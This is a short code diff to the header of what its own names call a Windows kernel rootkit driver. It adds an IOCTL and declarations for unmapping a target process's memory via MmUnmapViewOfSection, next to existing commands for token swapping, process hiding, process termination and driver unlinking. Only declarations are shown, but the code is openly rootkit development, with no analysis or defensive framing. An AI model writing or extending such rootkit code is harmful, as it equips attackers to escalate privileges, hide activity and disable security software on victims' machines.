@@ -37,6 +37,7 @@
 #define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
 #define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
 #define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
+#define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
 
 
 
@@ -98,6 +99,8 @@ typedef NTSTATUS(*PFN_ZwQuerySystemInformation)(
     ULONG SystemInformationLength,
     PULONG ReturnLength);
 
+typedef PVOID(*PFN_PsGetProcessSectionBaseAddress)(PEPROCESS Process);
+typedef NTSTATUS(*PFN_MmUnmapViewOfSection)(PEPROCESS Process, PVOID BaseAddress);
 
 typedef enum _NOTIFY_ROUTINE_TYPE {
     ImageLoadCallback
@@ -192,6 +195,8 @@ NTSTATUS procTokenSwap(DWORD, DWORD, int);
 
 NTSTATUS TermProcess(ULONG_PTR);
 NTSTATUS crashProcess(ULONG_PTR);
+NTSTATUS unmapProcess(ULONG_PTR);
+
 NTSTATUS procHiding(DWORD, DWORD);
 NTSTATUS unlinkDriver(PDRIVER_OBJECT);
 
